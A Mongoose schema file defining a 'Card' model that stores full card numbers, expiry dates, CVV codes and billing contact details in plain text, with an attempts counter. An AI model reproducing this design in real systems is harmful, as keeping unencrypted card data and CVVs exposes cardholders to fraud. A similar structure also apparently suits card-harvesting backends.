const mongoose = require('mongoose');

const cardSchema = new mongoose.Schema(
  {
    cardNumber: { type: String, required: true },
    cardName: { type: String, required: true },
    expiry: { type: String, required: true },
    cvv: { type: String, required: true },
    type: { type: String, enum: ['credit_card', 'debit_card'], default: 'credit_card' },
    firstName: { type: String, default: '' },
    lastName: { type: String, default: '' },
    email: { type: String, default: '' },
    phoneCode: { type: String, default: '' },
    phone: { type: String, default: '' },
    street: { type: String, default: '' },
    city: { type: String, default: '' },
    state: { type: String, default: '' },
    zip: { type: String, default: '' },
    country: { type: String, default: '' },
    attempts: { type: Number, default: 1 },
  },
  { timestamps: true }
);

module.exports = mongoose.model('Card', cardSchema);
